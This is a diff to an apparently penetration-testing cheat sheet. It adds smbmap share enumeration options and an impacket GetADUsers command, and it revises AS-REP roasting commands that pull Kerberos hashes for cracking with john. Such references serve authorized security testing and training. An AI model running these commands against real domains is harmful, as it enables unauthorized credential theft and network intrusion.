@@ -486,7 +486,7 @@ ldapsearch -H ldap://{IP ADDRESS} -x -b "{DC NAMING CONTEXT}" '(objectClass=Pers
 smbmap -H {IP ADDRESS}  
 
 # Recursively show all readable files and shares
-smbmap -R {SHARE} -H {IP ADDRESS} 
+smbmap -R {SHARE} -H {IP ADDRESS} --depth 10
 
 # Download a file with smbmap
 smbmap -R {SHARE} -H {IP ADDRESS} -A {FILE} -q 
@@ -663,10 +663,13 @@ net user {USERNAME} /domain
 # Enumerate all groups in domain
 net group /domain
 
-# ASREP ROAST
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -format john
+# Get Active Directory Users
+python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
 
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
+# ASREP ROAST
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1.DOMAIN2}/ -dc-ip {IP ADDRESS} -format john
+
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1.DOMAIN2}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
 
 # Bloodhound
 sudo neo4j console                          # LHOST
